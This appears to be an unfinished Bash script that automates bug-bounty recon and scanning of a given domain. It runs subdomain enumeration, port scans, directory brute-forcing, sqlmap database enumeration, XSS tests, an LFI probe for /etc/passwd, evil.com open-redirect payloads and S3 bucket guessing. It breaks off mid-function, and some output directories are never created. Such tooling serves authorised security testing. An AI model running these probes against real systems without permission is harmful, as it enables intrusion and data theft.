# BugBountyAutomator.sh - A comprehensive bug bounty automation script
# This script automates multiple phases of bug bounty hunting and penetration testing

# Colors for better output readability
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# Variables
TARGET=$1
OUTPUT_DIR="recon_$TARGET"
SUBDOMAINS_FILE="$OUTPUT_DIR/subdomains.txt"
ALIVE_FILE="$OUTPUT_DIR/alive.txt"
SCREENSHOTS_DIR="$OUTPUT_DIR/screenshots"
JS_DIR="$OUTPUT_DIR/js_files"
ENDPOINTS_FILE="$OUTPUT_DIR/endpoints.txt"
VULNERABLE_FILE="$OUTPUT_DIR/vulnerabilities.txt"
WORDLIST="/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt"
NUCLEI_TEMPLATES="/path/to/nuclei-templates" # Update this path
LOG_FILE="$OUTPUT_DIR/script.log"
PROGRESS_FILE="$OUTPUT_DIR/progress.txt"
CONFIG_FILE="config.ini"

# Report Generation Function
generate_report() {
    local REPORT_FILE="$OUTPUT_DIR/report.md"
    echo "# Bug Bounty Report for $TARGET" > "$REPORT_FILE"
    echo "Generated on: $(date)" >> "$REPORT_FILE"
    echo "" >> "$REPORT_FILE"
    
    # Add subdomain findings
    echo "## Subdomains" >> "$REPORT_FILE"
    if [ -f "$SUBDOMAINS_FILE" ]; then
        echo "Found $(wc -l < "$SUBDOMAINS_FILE") subdomains:" >> "$REPORT_FILE"
        cat "$SUBDOMAINS_FILE" >> "$REPORT_FILE"
    fi
    
    # Add vulnerability findings
    echo "## Vulnerabilities" >> "$REPORT_FILE"
    if [ -d "$OUTPUT_DIR/vulnerabilities" ]; then
        find "$OUTPUT_DIR/vulnerabilities" -type f -exec cat {} \; >> "$REPORT_FILE"
    fi
    
    # Add S3 bucket findings
    echo "## S3 Buckets" >> "$REPORT_FILE"
    if [ -f "$OUTPUT_DIR/s3_buckets.txt" ]; then
        cat "$OUTPUT_DIR/s3_buckets.txt" >> "$REPORT_FILE"
    else
        echo "No S3 buckets found." >> "$REPORT_FILE"
    fi
    
    echo -e "${GREEN}[+] Report generated: $REPORT_FILE${NC}"
}

# Error Handling Function
handle_error() {
    local error_msg="$1"
    local error_code="${2:-1}"
    echo -e "${RED}[!] Error: $error_msg${NC}"
    log "ERROR" "$error_msg"
    exit "$error_code"
}

# Cleanup Function
cleanup() {
    echo -e "${YELLOW}[*] Cleaning up temporary files...${NC}"
    rm -f "$OUTPUT_DIR/temp_*" 2>/dev/null
    echo -e "${GREEN}[+] Cleanup completed${NC}"
}

# Input Validation Function
validate_input() {
    if [[ ! "$TARGET" =~ ^[a-zA-Z0-9][a-zA-Z0-9-]*\.[a-zA-Z]{2,}$ ]]; then
        handle_error "Invalid domain format"
    fi
    
    if [ ! -f "$WORDLIST" ]; then
        handle_error "Wordlist file not found: $WORDLIST"
    fi
}

# Timeout Handling Function
run_with_timeout() {
    local timeout=$1
    shift
    "$@" &
    local pid=$!
    sleep $timeout
    if kill -0 $pid 2>/dev/null; then
        kill $pid
        echo -e "${RED}[!] Command timed out after ${timeout}s${NC}"
        return 1
    fi
    wait $pid
    return $?
}

# Progress Tracking Function
update_progress() {
    echo "$1" >> "$PROGRESS_FILE"
}

check_progress() {
    if [ -f "$PROGRESS_FILE" ]; then
        echo -e "${YELLOW}[*] Previous progress found. Continue from last point? (y/n)${NC}"
        read -r response
        if [[ "$response" =~ ^[Yy]$ ]]; then
            return 0
        fi
    fi
    return 1
}

# Resource Management Function
check_resources() {
    local required_memory=2048  # 2GB
    local available_memory=$(free -m | awk '/^Mem:/{print $7}')
    
    if [ "$available_memory" -lt "$required_memory" ]; then
        echo -e "${RED}[!] Warning: Low memory available (${available_memory}MB)${NC}"
        echo -e "${YELLOW}[*] Recommended: ${required_memory}MB${NC}"
        read -p "Continue anyway? (y/n) " response
        if [[ ! "$response" =~ ^[Yy]$ ]]; then
            exit 1
        fi
    fi
}

# Logging Function
log() {
    local level="$1"
    local message="$2"
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] [$level] $message" >> "$LOG_FILE"
    echo -e "$message"
}

# Configuration Support Function
load_config() {
    if [ -f "$CONFIG_FILE" ]; then
        source "$CONFIG_FILE"
    else
        echo -e "${YELLOW}[*] No config file found. Using defaults.${NC}"
    fi
}

# Rate Limiting Function
rate_limit() {
    local delay=$1
    sleep "$delay"
}

# Set up trap for cleanup
trap cleanup EXIT

# Banner
echo -e "${RED}"
cat << "EOF"
 ____             ____                   _           _                        _             
|  _ \           |  _ \                 | |         | |                      | |            
| |_) |_   _  __ | |_) | ___  _   _ _ __| |_ _   _  | |     _   _ _ __   ___| |__   ___ _ __
|  _ <| | | |/ _\|  _ < / _ \| | | | '__| __| | | | | |    | | | | '_ \ / __| '_ \ / _ \ '__|
| |_) | |_| | (_| |_) | (_) | |_| | |  | |_| |_| | | |____| |_| | | | | (__| | | |  __/ |   
|____/ \__,_|\__|____/ \___/ \__,_|_|   \__|\__, | |______|\__,_|_| |_|\___|_| |_|\___|_|   
                                              __/ |                                         
                                             |___/                                          
EOF
echo -e "${NC}"
echo -e "${CYAN}[*] Comprehensive Bug Bounty Automation Script${NC}"
echo -e "${CYAN}[*] Ethical Hacking & Bug Bounty Hunting Tool${NC}"
echo -e "${CYAN}[*] Author: Claude${NC}"
echo -e "${CYAN}[*] DISCLAIMER: This tool is for EDUCATIONAL PURPOSES ONLY. Ethical hacking and bug bounty hunting should always be done LEGALLY and WITH PERMISSION from authorized platforms.${NC}"
echo ""

# Check if a domain is provided
if [ -z "$1" ]; then
    echo -e "${RED}[!] Error: No target domain specified${NC}"
    echo -e "${YELLOW}[*] Usage: ./BugBountyAutomator.sh example.com [options]${NC}"
    exit 1
fi

# Create output directory structure
setup_directories() {
    echo -e "${BLUE}[*] Setting up directory structure...${NC}"
    mkdir -p "$OUTPUT_DIR"
    mkdir -p "$SCREENSHOTS_DIR"
    mkdir -p "$JS_DIR"
    mkdir -p "$OUTPUT_DIR/content_discovery"
    mkdir -p "$OUTPUT_DIR/vulnerabilities"
    mkdir -p "$OUTPUT_DIR/ports"
    echo -e "${GREEN}[+] Directory structure created successfully${NC}"
}

# 1. Subdomain Enumeration
subdomain_enum() {
    echo -e "\n${YELLOW}[*] Phase 1: Starting Subdomain Enumeration...${NC}"
    
    # Using Subfinder (matches the command from the document)
    if command -v subfinder &> /dev/null; then
        echo -e "${BLUE}[*] Running Subfinder...${NC}"
        subfinder -d "$TARGET" -o "$OUTPUT_DIR/subfinder.txt"
        echo -e "${GREEN}[+] Subfinder completed${NC}"
    else
        echo -e "${RED}[!] Subfinder not found. Please install it.${NC}"
    fi
    
    # Using Amass (matches the command from the document)
    if command -v amass &> /dev/null; then
        echo -e "${BLUE}[*] Running Amass (passive mode)...${NC}"
        amass enum -passive -d "$TARGET" -o "$OUTPUT_DIR/amass_subdomains.txt"
        echo -e "${GREEN}[+] Amass completed${NC}"
    else
        echo -e "${RED}[!] Amass not found. Please install it.${NC}"
    fi
    
    # Using Assetfinder (matches the command from the document)
    if command -v assetfinder &> /dev/null; then
        echo -e "${BLUE}[*] Running Assetfinder...${NC}"
        assetfinder --subs-only "$TARGET" > "$OUTPUT_DIR/assetfinder.txt"
        echo -e "${GREEN}[+] Assetfinder completed${NC}"
    else
        echo -e "${RED}[!] Assetfinder not found. Please install it.${NC}"
    fi
    
    # Combine all subdomain results and remove duplicates
    echo -e "${BLUE}[*] Combining subdomain results...${NC}"
    cat "$OUTPUT_DIR/subfinder.txt" "$OUTPUT_DIR/amass_subdomains.txt" "$OUTPUT_DIR/assetfinder.txt" 2>/dev/null | sort -u > "$SUBDOMAINS_FILE"
    echo -e "${GREEN}[+] Found $(wc -l < "$SUBDOMAINS_FILE") unique subdomains${NC}"
}

# 2. Check for alive subdomains using httpx
check_alive() {
    echo -e "\n${YELLOW}[*] Phase 2: Checking for alive subdomains...${NC}"
    
    if command -v httpx &> /dev/null; then
        echo -e "${BLUE}[*] Running httpx to check for alive domains...${NC}"
        cat "$SUBDOMAINS_FILE" | httpx -silent -status-code -title -tech-detect -follow-redirects -o "$ALIVE_FILE"
        echo -e "${GREEN}[+] Alive check completed. Found $(wc -l < "$ALIVE_FILE") alive subdomains${NC}"
    else
        echo -e "${RED}[!] httpx not found. Please install it.${NC}"
        # Fallback to basic curl check
        echo -e "${BLUE}[*] Falling back to basic curl check...${NC}"
        while read subdomain; do
            if curl --max-time 10 -s -o /dev/null -I -w "%{http_code}" "https://$subdomain" | grep -q '2[0-9][0-9]\|3[0-9][0-9]'; then
                echo "$subdomain" >> "$ALIVE_FILE"
            fi
        done < "$SUBDOMAINS_FILE"
        echo -e "${GREEN}[+] Alive check completed. Found $(wc -l < "$ALIVE_FILE") alive subdomains${NC}"
    fi
}

# 3. Port Scanning
port_scan() {
    echo -e "\n${YELLOW}[*] Phase 3: Starting Port Scanning...${NC}"
    
    # Using nmap (matches the command from the document)
    if command -v nmap &> /dev/null; then
        echo -e "${BLUE}[*] Running nmap for detailed service detection...${NC}"
        while read domain; do
            clean_domain=$(echo "$domain" | cut -d' ' -f1)
            echo -e "${BLUE}[*] Scanning $clean_domain with nmap...${NC}"
            nmap -p- -sV -T4 --open -oN "$OUTPUT_DIR/ports/nmap_$clean_domain.nmap" "$clean_domain"
        done < <(head -n 5 "$ALIVE_FILE") # Limit to first 5 domains to save time
        echo -e "${GREEN}[+] Nmap scan completed${NC}"
    else
        echo -e "${RED}[!] nmap not found. Please install it.${NC}"
    fi
    
    # Using masscan for fast initial scan (matches the command from the document)
    if command -v masscan &> /dev/null; then
        echo -e "${BLUE}[*] Running masscan for fast port discovery...${NC}"
        # Extract IPs from alive subdomains
        while read domain; do
            host "$domain" | grep "has address" | cut -d" " -f4 >> "$OUTPUT_DIR/ips.txt"
        done < "$ALIVE_FILE"
        
        if [ -s "$OUTPUT_DIR/ips.txt" ]; then
            masscan -p1-65535 --rate=1000 -iL "$OUTPUT_DIR/ips.txt" -oX "$OUTPUT_DIR/ports/masscan.xml"
            echo -e "${GREEN}[+] Masscan completed${NC}"
        else
            echo -e "${RED}[!] No IPs found for port scanning${NC}"
        fi
    else
        echo -e "${RED}[!] Masscan not found. Please install it.${NC}"
    fi
}

# 4. Screenshot Capture
take_screenshots() {
    echo -e "\n${YELLOW}[*] Phase 4: Taking screenshots of alive domains...${NC}"
    
    # Using eyewitness for screenshots (matches the command from the document)
    if command -v eyewitness &> /dev/null; then
        echo -e "${BLUE}[*] Running EyeWitness for screenshots...${NC}"
        eyewitness -f "$ALIVE_FILE" --web -d "$SCREENSHOTS_DIR" --no-prompt
        echo -e "${GREEN}[+] Screenshots captured with EyeWitness${NC}"
    # Using aquatone as alternative (matches the command from the document)
    elif command -v aquatone &> /dev/null; then
        echo -e "${BLUE}[*] Running aquatone for screenshots...${NC}"
        cat "$ALIVE_FILE" | cut -d' ' -f1 | aquatone -out "$SCREENSHOTS_DIR"
        echo -e "${GREEN}[+] Screenshots captured with aquatone${NC}"
    else
        echo -e "${RED}[!] No screenshot tool found. Please install aquatone or EyeWitness.${NC}"
    fi
}

# 5. Content Discovery and Directory Bruteforcing
content_discovery() {
    echo -e "\n${YELLOW}[*] Phase 5: Starting Content Discovery...${NC}"
    
    # 5.1 Gather URLs from Wayback Machine and Common Crawl (matches the command from the document)
    echo -e "${BLUE}[*] Gathering URLs from archives...${NC}"
    if command -v gau &> /dev/null; then
        echo -e "${BLUE}[*] Running gau (GetAllUrls)...${NC}"
        gau "$TARGET" > "$OUTPUT_DIR/content_discovery/gau.txt"
        echo -e "${GREEN}[+] gau completed${NC}"
    else
        echo -e "${RED}[!] gau not found. Please install it.${NC}"
    fi
    
    # Using waybackurls (matches the command from the document)
    if command -v waybackurls &> /dev/null; then
        echo -e "${BLUE}[*] Running waybackurls...${NC}"
        echo "$TARGET" | waybackurls > "$OUTPUT_DIR/content_discovery/waybackurls.txt"
        echo -e "${GREEN}[+] waybackurls completed${NC}"
    else
        echo -e "${RED}[!] waybackurls not found. Please install it.${NC}"
    fi
    
    # Combine all URLs and filter for interesting extensions
    cat "$OUTPUT_DIR/content_discovery/gau.txt" "$OUTPUT_DIR/content_discovery/waybackurls.txt" 2>/dev/null | sort -u > "$OUTPUT_DIR/content_discovery/all_urls.txt"
    
    echo -e "${BLUE}[*] Extracting interesting files (JS, PHP, etc.)...${NC}"
    grep -E "\.js$" "$OUTPUT_DIR/content_discovery/all_urls.txt" > "$OUTPUT_DIR/content_discovery/js_files.txt"
    grep -E "\.(php|aspx|jsp|asp)$" "$OUTPUT_DIR/content_discovery/all_urls.txt" > "$OUTPUT_DIR/content_discovery/server_files.txt"
    
    # 5.2 Directory Bruteforcing with FFUF (matches the command from the document)
    echo -e "${BLUE}[*] Starting directory bruteforcing with ffuf...${NC}"
    if command -v ffuf &> /dev/null; then
        mkdir -p "$OUTPUT_DIR/content_discovery/ffuf"
        while read domain; do
            clean_domain=$(echo "$domain" | cut -d' ' -f1)
            echo -e "${BLUE}[*] Bruteforcing directories on $clean_domain${NC}"
            ffuf -w "$WORDLIST" -u "https://$clean_domain/FUZZ" -mc 200,204,301,302,307,401,403 -o "$OUTPUT_DIR/content_discovery/ffuf/$clean_domain.json" -of json
        done < <(head -n 5 "$ALIVE_FILE") # Limit to first 5 domains to save time
        echo -e "${GREEN}[+] FFUF directory bruteforcing completed${NC}"
    # Using Gobuster as an alternative (matches the command from the document)
    elif command -v gobuster &> /dev/null; then
        mkdir -p "$OUTPUT_DIR/content_discovery/gobuster"
        while read domain; do
            clean_domain=$(echo "$domain" | cut -d' ' -f1)
            echo -e "${BLUE}[*] Bruteforcing directories on $clean_domain${NC}"
            gobuster dir -u "https://$clean_domain" -w "$WORDLIST" -o "$OUTPUT_DIR/content_discovery/gobuster/$clean_domain.txt"
        done < <(head -n 5 "$ALIVE_FILE") # Limit to first 5 domains to save time
        echo -e "${GREEN}[+] Gobuster directory bruteforcing completed${NC}"
    else
        echo -e "${RED}[!] No directory bruteforcing tool found. Please install ffuf or gobuster.${NC}"
    fi
}

# 6. JavaScript Analysis
js_analysis() {
    echo -e "\n${YELLOW}[*] Phase 6: JavaScript Analysis...${NC}"
    
    # Download JS files
    echo -e "${BLUE}[*] Downloading JavaScript files...${NC}"
    mkdir -p "$JS_DIR"
    if [ -f "$OUTPUT_DIR/content_discovery/js_files.txt" ]; then
        cat "$OUTPUT_DIR/content_discovery/js_files.txt" | while read js_file; do
            filename=$(basename "$js_file")
            curl -s -k -L "$js_file" -o "$JS_DIR/$filename" 2>/dev/null
        done
        echo -e "${GREEN}[+] Downloaded $(ls -1 "$JS_DIR" | wc -l) JavaScript files${NC}"
    else
        echo -e "${RED}[!] No JavaScript files found${NC}"
    fi
    
    # Analyze JS files with LinkFinder (matches the command from the document)
    if command -v linkfinder.py &> /dev/null; then
        echo -e "${BLUE}[*] Analyzing JavaScript files with LinkFinder...${NC}"
        for js_file in "$JS_DIR"/*; do
            if [ -f "$js_file" ]; then
                base_name=$(basename "$js_file")
                linkfinder.py -i "$js_file" -o "$OUTPUT_DIR/js_endpoints/$base_name.txt"
            fi
        done
        echo -e "${GREEN}[+] LinkFinder analysis completed${NC}"
    else
        echo -e "${RED}[!] LinkFinder not found. Please install it.${NC}"
    fi
    
    # Extract sensitive information from JS files with GF (matches the command from the document)
    echo -e "${BLUE}[*] Extracting sensitive information from JS files...${NC}"
    mkdir -p "$OUTPUT_DIR/sensitive"
    if command -v gf &> /dev/null; then
        for js_file in "$JS_DIR"/*; do
            if [ -f "$js_file" ]; then
                base_name=$(basename "$js_file")
                cat "$js_file" | gf secrets > "$OUTPUT_DIR/sensitive/secrets_$base_name.txt"
                cat "$js_file" | gf aws-keys > "$OUTPUT_DIR/sensitive/aws_keys_$base_name.txt"
                cat "$js_file" | gf firebase > "$OUTPUT_DIR/sensitive/firebase_$base_name.txt"
            fi
        done
        echo -e "${GREEN}[+] Sensitive information extraction completed${NC}"
    else
        echo -e "${RED}[!] gf not found. Please install it.${NC}"
        # Fallback to grep
        echo -e "${BLUE}[*] Falling back to grep for sensitive info extraction...${NC}"
        grep -r "api[_-]key" "$JS_DIR" > "$OUTPUT_DIR/sensitive/api_keys.txt"
        grep -r "aws[_-]key\|aws[_-]secret\|amazon" "$JS_DIR" > "$OUTPUT_DIR/sensitive/aws_keys.txt"
        echo -e "${GREEN}[+] Basic sensitive information extraction completed${NC}"
    fi
}

# 7. Parameter Discovery
param_discovery() {
    echo -e "\n${YELLOW}[*] Phase 7: Parameter Discovery...${NC}"
    
    # Using ParamSpider for parameter discovery (matches the command from the document)
    if command -v python3 &> /dev/null && [ -f "paramspider.py" ]; then
        echo -e "${BLUE}[*] Running ParamSpider for parameter discovery...${NC}"
        python3 paramspider.py -d "$TARGET" -o "$OUTPUT_DIR/parameters/paramspider.txt"
        echo -e "${GREEN}[+] ParamSpider completed${NC}"
    else
        echo -e "${RED}[!] ParamSpider not found. If you want to use it, please install it.${NC}"
    fi
    
    # Using Arjun for parameter discovery (matches the command from the document)
    if command -v python3 &> /dev/null && [ -f "arjun.py" ]; then
        echo -e "${BLUE}[*] Running Arjun for parameter discovery...${NC}"
        mkdir -p "$OUTPUT_DIR/parameters"
        
        # Extract base URLs from alive domains
        cat "$ALIVE_FILE" | cut -d' ' -f1 | head -n 5 > "$OUTPUT_DIR/base_urls.txt"
        
        while read url; do
            echo -e "${BLUE}[*] Discovering parameters on $url${NC}"
            python3 arjun.py -u "https://$url/api" -o "$OUTPUT_DIR/parameters/arjun_$url.json"
        done < "$OUTPUT_DIR/base_urls.txt"
        
        echo -e "${GREEN}[+] Arjun parameter discovery completed${NC}"
    else
        echo -e "${RED}[!] Arjun not found. If you want to use it, please install it.${NC}"
    fi
}

# 8. Vulnerability Scanning
vuln_scanning() {
    echo -e "\n${YELLOW}[*] Phase 8: Vulnerability Scanning...${NC}"
    
    # 8.1 Basic Security Headers Check with Nikto and HTTPX (matches the command from the document)
    echo -e "${BLUE}[*] Checking security headers with Nikto and HTTPX...${NC}"
    mkdir -p "$OUTPUT_DIR/vulnerabilities/headers"
    
    if command -v nikto &> /dev/null; then
        echo -e "${BLUE}[*] Running Nikto for security header analysis...${NC}"
        while read domain; do
            clean_domain=$(echo "$domain" | cut -d' ' -f1)
            echo -e "${BLUE}[*] Scanning $clean_domain with Nikto...${NC}"
            nikto -h "$clean_domain" -o "$OUTPUT_DIR/vulnerabilities/headers/nikto_$clean_domain.txt"
        done < <(head -n 3 "$ALIVE_FILE") # Limit to first 3 domains to save time
        echo -e "${GREEN}[+] Nikto scan completed${NC}"
    else
        echo -e "${RED}[!] Nikto not found. Please install it for comprehensive header checks.${NC}"
    fi
    
    if command -v httpx &> /dev/null; then
        echo -e "${BLUE}[*] Running HTTPX for quick security header analysis...${NC}"
        cat "$ALIVE_FILE" | cut -d' ' -f1 | httpx -sc -title -server -o "$OUTPUT_DIR/vulnerabilities/headers/httpx_results.txt"
        echo -e "${GREEN}[+] HTTPX header analysis completed${NC}"
    fi
    
    # 8.2 XSS Scanning with Dalfox and XSStrike (matches the command from the document)
    if command -v dalfox &> /dev/null; then
        echo -e "${BLUE}[*] Running Dalfox for XSS scanning...${NC}"
        if [ -f "$OUTPUT_DIR/parameters/paramspider.txt" ]; then
            cat "$OUTPUT_DIR/parameters/paramspider.txt" | dalfox pipe -o "$OUTPUT_DIR/vulnerabilities/xss_results.txt"
            echo -e "${GREEN}[+] Dalfox XSS scan completed${NC}"
        else
            echo -e "${RED}[!] No parameter list found for XSS scanning${NC}"
        fi
    elif command -v xsstrike &> /dev/null; then
        echo -e "${BLUE}[*] Running XSStrike for XSS scanning...${NC}"
        if [ -f "$OUTPUT_DIR/parameters/paramspider.txt" ]; then
            grep "=" "$OUTPUT_DIR/parameters/paramspider.txt" | head -n 5 > "$OUTPUT_DIR/parameters/params_for_xss.txt"
            while read url; do
                echo -e "${BLUE}[*] Testing XSS on $url${NC}"
                xsstrike -u "$url" --file "$OUTPUT_DIR/vulnerabilities/xsstrike_$(echo "$url" | md5sum | cut -d' ' -f1).txt"
            done < "$OUTPUT_DIR/parameters/params_for_xss.txt"
            echo -e "${GREEN}[+] XSStrike scan completed${NC}"
        else
            echo -e "${RED}[!] No parameter list found for XSS scanning${NC}"
        fi
    else
        echo -e "${RED}[!] No XSS scanning tool found. Please install Dalfox or XSStrike.${NC}"
    fi
    
    # 8.3 SQL Injection scanning with SQLmap (matches the command from the document)
    if command -v sqlmap &> /dev/null; then
        echo -e "${BLUE}[*] Running SQLmap for SQL injection scanning...${NC}"
        if [ -f "$OUTPUT_DIR/parameters/paramspider.txt" ]; then
            grep "=" "$OUTPUT_DIR/parameters/paramspider.txt" | grep -E "id=[0-9]+" | head -n 5 > "$OUTPUT_DIR/parameters/params_for_sqli.txt"
            while read url; do
                echo -e "${BLUE}[*] Testing SQL injection on $url${NC}"
                sqlmap -u "$url" --dbs --batch --random-agent --level 1 --risk 1 --output-dir="$OUTPUT_DIR/vulnerabilities/sqlmap"
            done < "$OUTPUT_DIR/parameters/params_for_sqli.txt"
            echo -e "${GREEN}[+] SQLmap scan completed${NC}"
        else
            echo -e "${RED}[!] No parameter list found for SQL injection scanning${NC}"
        fi
    else
        echo -e "${RED}[!] SQLmap not found. Please install it.${NC}"
    fi
    
    # 8.4 SSRF Detection with Interactsh (matches the command from the document)
    echo -e "${BLUE}[*] Setting up for SSRF detection...${NC}"
    if command -v interactsh-client &> /dev/null; then
        echo -e "${BLUE}[*] Running Interactsh for SSRF detection...${NC}"
        interactsh-client -v > "$OUTPUT_DIR/vulnerabilities/interactsh_output.txt" &
        INTERACTSH_PID=$!
        sleep 5
        
        # Extract Interactsh URL from the output
        INTERACTSH_URL=$(grep -oP 'URL: \K(.*?)\.interact\.sh' "$OUTPUT_DIR/vulnerabilities/interactsh_output.txt")
        
        echo -e "${BLUE}[*] Using Interactsh URL: $INTERACTSH_URL${NC}"
        echo -e "${YELLOW}[!] Include this URL in your SSRF payloads to detect blind SSRF vulnerabilities${NC}"
        
        # Let it run for a while
        echo -e "${BLUE}[*] Waiting for callbacks (30 seconds)...${NC}"
        sleep 30
        
        # Kill the Interactsh client
        kill $INTERACTSH_PID
        echo -e "${GREEN}[+] SSRF detection setup completed${NC}"
    else
        echo -e "${RED}[!] Interactsh-client not found. Please install it for SSRF detection.${NC}"
    fi
    
    # 8.5 LFI Detection (matches the command from the document)
    echo -e "${BLUE}[*] Setting up for LFI detection...${NC}"
    if command -v lfi-suite &> /dev/null; then
        echo -e "${BLUE}[*] Running LFI Suite for LFI vulnerability detection...${NC}"
        if [ -f "$OUTPUT_DIR/parameters/paramspider.txt" ]; then
            grep -E "file=|path=|include=" "$OUTPUT_DIR/parameters/paramspider.txt" | head -n 5 > "$OUTPUT_DIR/parameters/params_for_lfi.txt"
            while read url; do
                echo -e "${BLUE}[*] Testing LFI on $url${NC}"
                lfi-suite -u "$url/etc/passwd" -o "$OUTPUT_DIR/vulnerabilities/lfi/$(echo "$url" | md5sum | cut -d' ' -f1).txt"
            done < "$OUTPUT_DIR/parameters/params_for_lfi.txt"
            echo -e "${GREEN}[+] LFI Suite scan completed${NC}"
        else
            echo -e "${RED}[!] No parameter list found for LFI scanning${NC}"
        fi
    elif command -v fimap &> /dev/null; then
        echo -e "${BLUE}[*] Running FI Map for LFI/RFI vulnerability detection...${NC}"
        if [ -f "$OUTPUT_DIR/parameters/paramspider.txt" ]; then
            grep -E "file=|path=|include=" "$OUTPUT_DIR/parameters/paramspider.txt" | head -n 5 > "$OUTPUT_DIR/parameters/params_for_lfi.txt"
            while read url; do
                echo -e "${BLUE}[*] Testing LFI/RFI on $url${NC}"
                fimap -u "$url" --test-lfi --test-rfi -o "$OUTPUT_DIR/vulnerabilities/fimap/$(echo "$url" | md5sum | cut -d' ' -f1).txt"
            done < "$OUTPUT_DIR/parameters/params_for_lfi.txt"
            echo -e "${GREEN}[+] FI Map scan completed${NC}"
        else
            echo -e "${RED}[!] No parameter list found for LFI/RFI scanning${NC}"
        fi
    else
        echo -e "${RED}[!] No LFI/RFI scanning tool found. Please install LFI Suite or FI Map.${NC}"
    fi
    
    # 8.6 Open Redirect Detection (matches the command from the document)
    echo -e "${BLUE}[*] Setting up for Open Redirect detection...${NC}"
    if command -v oralizer &> /dev/null; then
        echo -e "${BLUE}[*] Running Oralizer for Open Redirect vulnerability detection...${NC}"
        # Create a list of potential redirect payloads
        mkdir -p "$OUTPUT_DIR/vulnerabilities/open_redirect"
        echo "https://evil.com" > "$OUTPUT_DIR/payloads.txt"
        echo "//evil.com" >> "$OUTPUT_DIR/payloads.txt"
        echo "evil.com" >> "$OUTPUT_DIR/payloads.txt"
        
        if [ -f "$OUTPUT_DIR/parameters/paramspider.txt" ]; then
            grep -E "url=|redirect=|next=|redir=|return=|return_to=|destination=|goto=|checkout_url=|continue=|return_path=" "$OUTPUT_DIR/parameters/paramspider.txt" > "$OUTPUT_DIR/parameters/params_for_redirect.txt"
            oralizer -l "$OUTPUT_DIR/parameters/params_for_redirect.txt" -p "$OUTPUT_DIR/payloads.txt" -o "$OUTPUT_DIR/vulnerabilities/open_redirect/results.txt"
            echo -e "${GREEN}[+] Oralizer Open Redirect scan completed${NC}"
        else
            echo -e "${RED}[!] No parameter list found for Open Redirect scanning${NC}"
        fi
    else
        echo -e "${RED}[!] Oralizer not found. Please install it for Open Redirect detection.${NC}"
    fi
    
    # Using Nuclei for automated vulnerability scanning
    if command -v nuclei &> /dev/null; then
        echo -e "${BLUE}[*] Running Nuclei for vulnerability scanning...${NC}"
        nuclei -l "$ALIVE_FILE" -t "$NUCLEI_TEMPLATES" -o "$OUTPUT_DIR/vulnerabilities/nuclei_results.txt" -severity low,medium,high,critical
        echo -e "${GREEN}[+] Nuclei scan completed${NC}"
    else
        echo -e "${RED}[!] Nuclei not found. Please install it.${NC}"
    fi
}

# 9. S3 Bucket Enumeration
s3_bucket_enum() {
    echo -e "\n${YELLOW}[*] Phase 9: S3 Bucket Enumeration...${NC}"
    
    # Using awsbucketdump for S3 bucket enumeration (matches the command from the document)
    if command -v awsbucketdump &> /dev/null; then
        echo -e "${BLUE}[*] Running awsbucketdump for S3 bucket enumeration...${NC}"
        mkdir -p "$OUTPUT_DIR/s3_buckets"
        
        # Generate potential bucket names based on the target domain
        echo "$TARGET" > "$OUTPUT_DIR/s3_wordlist.txt"
        echo "$TARGET-dev" >> "$OUTPUT_DIR/s3_wordlist.txt"
        echo "$TARGET-prod" >> "$OUTPUT_DIR/s3_wordlist.txt"
        echo "$TARGET-stage" >> "$OUTPUT_DIR/s3_wordlist.txt"
        echo "$TARGET-staging" >> "$OUTPUT_DIR/s3_wordlist.txt"
        echo "$TARGET-test" >> "$OUTPUT_DIR/s3_wordlist.txt"
        
        # Check each potential bucket name
        while read bucket_name; do
            echo -e "${BLUE}[*] Checking S3 bucket: $bucket_name${NC}"
            awsbucketdump "$bucket_name" > "$OUTPUT_DIR/s3_buckets/$bucket_name.txt"
        done < "$OUTPUT_DIR/s3_wordlist.txt"
        
        echo -e "${GREEN}[+] S3 bucket enumeration completed${NC}"
    else
        echo -e "${RED}[!] awsbucketdump not found. Using alternative method.${NC}"
        
        # Alternative: Generate potential bucket names
        echo -e "${BLUE}[*] Generating potential S3 bucket names...${NC}"
        mkdir -p "$OUTPUT_DIR/s3_buckets"
        echo "$TARGET" > "$OUTPUT_DIR/s3_wordlist.txt"
        echo "$TARGET-dev" >> "$OUTPUT_DIR/s3_wordlist.txt"
        echo "$TARGET-prod" >> "$OUTPUT_DIR/s3_wordlist.txt"
        echo "$TARGET-stage" >> "$OUTPUT_DIR/s3_wordlist.txt"
        echo "$TARGET-staging" >> "$OUTPUT_DIR/s3_wordlist.txt"
        echo "$TARGET-test" >> "$OUTPUT_DIR/s3_wordlist.txt"
        echo "$TARGET-backup" >> "$OUTPUT_DIR/s3_wordlist.txt"
        echo "$TARGET-www" >> "$OUTPUT_DIR/s3_wordlist.txt"
        echo "$TARGET-data" >> "$OUTPUT_DIR/s3_wordlist.txt"
        echo "$TARGET-assets" >> "$OUTPUT_DIR/s3_wordlist.txt"
        
        # Check if the buckets exist
        echo -e "${BLUE}[*] Checking if buckets exist...${NC}"
        while read bucket; do
            curl -s -o /dev/null -w "%{http_code}" "https://$bucket.s3.amazonaws.com" | grep -q "200" && echo "$bucket: Public" >> "$OUTPUT_DIR/s3_buckets.txt"
        done < "$OUTPUT_DIR/s3_wordlist.txt"
        echo -e "${GREEN}[+] Basic S3 bucket check completed${NC}"
    fi
}

# Additional functions from the document

# 10. CMS Enumeration
cms_enum() {
    echo -e "\n${YELLOW}[*] Phase 10: CMS Enumeration...${NC}"
    
    # Using CMSeek (matches the command from the document)
    if command -v cms-seek &> /dev/null; then
        echo -e "${BLUE}[*] Running CMSeek for CMS detection...${NC}"
        mkdir -p "$OUTPUT_DIR/cms"
        
        while read domain; do
            clean_domain=$(echo "$domain" | cut -d' ' -f1)
            echo -e "${BLUE}[*] Detecting CMS on $clean_domain${NC}"
            cms-seek -u "$clean_domain" -o "$OUTPUT_DIR/cms/$clean_domain.txt"
        done < <(head -n 10 "$ALIVE_FILE") # Limit to first 10 domains to save time
        
        echo -e "${GREEN}[+] CMS enumeration completed${NC}"
    else
        echo -e "${RED}[!] CMSeek not found. Please install it for CMS detection.${NC}"
    fi
}

# 11. WAF Detection
waf_detection() {
    echo -e "\n${YELLOW}[*] Phase 11: WAF Detection...${NC}"
    
    # Using wafw00f for WAF detection (matches the command from the document)
    if command -v wafw00f &> /dev/null; then
        echo -e "${BLUE}[*] Running wafw00f for WAF detection...${NC}"
